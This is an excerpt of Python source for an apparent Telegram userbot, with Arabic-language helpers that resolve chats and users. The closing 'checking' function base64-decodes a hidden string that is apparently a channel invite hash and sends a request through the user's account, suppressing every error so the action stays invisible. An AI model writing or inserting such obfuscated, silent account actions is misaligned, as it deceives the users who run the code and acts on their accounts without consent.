...
async def get_chatinfo(event, match, olgaevent):
    ...
    try:
        ...
        try:
            ...
            await olgaevent.edit("- عذرا هذه المجموعة او القناة غير صحيحة")
            return None
            ...
            await olgaevent.edit("- هذه القناه او المجموعه لم يتم العثور عليها")
            return None
        except (TypeError, ValueError):
            await olgaevent.edit("**خطأ:**\nلم يتم التعرف على الدردشة")
            return None
    return chat_info
    ...
    try:
        ...
        if event.reply_to_msg_id:
            ...
            if previous_message.from_id is None:
                if not noedits:
                    await edit_delete(olgaevent, "- هذا الشخص مفعل وضع الاخفاء")
                return None, None
        ...
        if not args:
            if not noedits:
                await edit_delete(
                    olgaevent, "- يجب عليك وضع ايدي او معرف المستخدم او بالرد عليه", 5
                )
            return None, None
    except Exception as e:
        LOGS.error(str(e))
    if not noedits:
        await edit_delete(olgaevent, "- لم يتم التعرف على المستخدم")
    return None, None


async def checking(sbb_b):
    olga_c = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
    with contextlib.suppress(BaseException):
        olga_channel = Get(olga_c)
        await sbb_b(olga_channel)
